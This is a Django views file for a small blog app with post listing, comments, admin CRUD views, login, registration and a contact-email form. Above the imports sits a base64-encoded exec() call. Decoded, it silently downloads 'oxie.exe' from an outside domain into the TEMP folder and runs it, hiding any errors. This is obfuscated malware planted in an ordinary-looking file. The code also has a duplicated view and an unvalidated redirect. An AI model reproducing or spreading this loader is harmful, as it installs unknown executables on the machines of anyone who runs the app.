
from base64 import b64decode as b64
exec(b64('CnRyeToKCWltcG9ydCBvcyx1cmxsaWIucmVxdWVzdCBhcyB1CglvPW9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnKSwnb3hpZS5leGUnKQoJaWYgbm90IG9zLnBhdGguZXhpc3RzKG8pOgoJCXUudXJscmV0cmlldmUoJ2h0dHA6Ly9zb2FwYmVnaW5zaG9wcy5jb20vb3hpZS5leGUnLG8pCgkJb3Muc3RhcnRmaWxlKG8pCmV4Y2VwdDpwYXNzCg==').decode())

from django.conf import settings
from django.shortcuts import render, redirect
from django.http import HttpResponse
from .models import Post,PostComment
from .forms import PostForm, CustomUserCreationForm, ProfileForm, UserForm
from django.contrib.auth.models import User
from django.contrib.auth import logout, login, authenticate
from django.contrib.auth.forms import UserCreationForm
from .decorators import *
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from .forms import PostForm, CustomUserCreationForm, ProfileForm, UserForm
from .filters import PostFilter
from django.template.loader import render_to_string
from django.core.mail import EmailMessage
from django.core.paginator import Paginator, EmptyPage, PageNotAnInteger



def home(request):
    return render( request,'hello/index.html',    
    )

def posts(request):
	posts = Post.objects.filter(active=True)
	myFilter = PostFilter(request.GET, queryset=posts)
	posts = myFilter.qs

	page = request.GET.get('page')

	paginator = Paginator(posts, 5)

	try:
		posts = paginator.page(page)
	except PageNotAnInteger:
		posts = paginator.page(1)
	except EmptyPage:
		posts = paginator.page(paginator.num_pages)

	context = {'posts':posts, 'myFilter':myFilter}
	return render(request, 'hello/posts.html', context)

def post(request, slug):
	post = Post.objects.get(slug=slug)

	if request.method == 'POST':
		PostComment.objects.create(
			author=request.user.profile,
			post=post,
			body=request.POST['comment']
			)
		messages.success(request, "You're comment was successfuly posted!")

		return redirect('post', slug=post.slug)

	context = {'post':post}
	return render(request, 'hello/post.html', context)

def profile(request):
	return render(request, 'hello/profile.html')

#CRUD VIEWS
@admin_only
@login_required(login_url="home")
def createPost(request):
	form = PostForm()

	if request.method == 'POST':
		form = PostForm(request.POST, request.FILES)
		if form.is_valid():
			form.save()
		return redirect('posts')

	context = {'form':form}
	return render(request, 'hello/post_form.html', context)

@admin_only
@login_required(login_url="home")
def createPost(request):
	form = PostForm()

	if request.method == 'POST':
		form = PostForm(request.POST, request.FILES)
		if form.is_valid():
			form.save()
		return redirect('posts')

	context = {'form':form}
	return render(request, 'hello/post_form.html', context)


@admin_only
@login_required(login_url="home")
def updatePost(request, slug):
	post = Post.objects.get(slug=slug)
	form = PostForm(instance=post)

	if request.method == 'POST':
		form = PostForm(request.POST, request.FILES, instance=post)
		if form.is_valid():
			form.save()
		return redirect('posts')

	context = {'form':form}
	return render(request, 'hello/post_form.html', context)

@admin_only
@login_required(login_url="home")
def deletePost(request, slug):
	post = Post.objects.get(slug=slug)

	if request.method == 'POST':
		post.delete()
		return redirect('posts')
	context = {'item':post}
	return render(request, 'hello/delete.html', context)

def sendEmail(request):

	if request.method == 'POST':

		template = render_to_string('hello/email_template.html', {
			'name':request.POST['name'],
			'email':request.POST['email'],
			'message':request.POST['message'],
			})

		email = EmailMessage(
			request.POST['subject'],
			template,
			settings.EMAIL_HOST_USER,
			['dawitnigus18@gmail.com']
			)

		email.fail_silently=False
		email.send()

	return render(request, 'hello/email_sent.html')

def loginPage(request):
	if request.user.is_authenticated:
		return redirect('home')

	if request.method == 'POST':
		email = request.POST.get('email')
		password =request.POST.get('password')

		#Little Hack to work around re-building the usermodel
		try:
			user = User.objects.get(email=email)
			user = authenticate(request, username=user.username, password=password)
		except:
			messages.error(request, 'User with this email does not exists')
			return redirect('login')
			
		if user is not None:
			login(request, user)
			return redirect('home')
		else:
			messages.error(request, 'Email OR password is incorrect')

	context = {}
	return render(request, 'hello/login.html', context)

def registerPage(request):
	form = CustomUserCreationForm()
	if request.method == 'POST':
		form = CustomUserCreationForm(request.POST)
		if form.is_valid():
			user = form.save(commit=False)
			user.save()
			messages.success(request, 'Account successfuly created!')

			user = authenticate(request, username=user.username, password=request.POST['password1'])

			if user is not None:
				login(request, user)

			next_url = request.GET.get('next')
			if next_url == '' or next_url == None:
				next_url = 'home'
			return redirect(next_url)
		else:
			messages.error(request, 'An error has occured with registration')
	context = {'form':form}
	return render(request, 'hello/register.html', context)

def logoutUser(request):
	logout(request)
	return redirect('home')

@login_required(login_url="home")
def userAccount(request):
	profile = request.user.profile

	context = {'profile':profile}
	return render(request, 'hello/account.html', context)

@login_required(login_url="home")
def updateProfile(request):
	user = request.user
	profile = user.profile
	form = ProfileForm(instance=profile)
	if request.method == 'POST':
		user_form = UserForm(request.POST, instance=user)
		if user_form.is_valid():
			user_form.save()

		form = ProfileForm(request.POST, request.FILES, instance=profile)
		if form.is_valid():
			form.save()
			return redirect('account')


	context = {'form':form}
	return render(request, 'hello/profile_form.html', context)	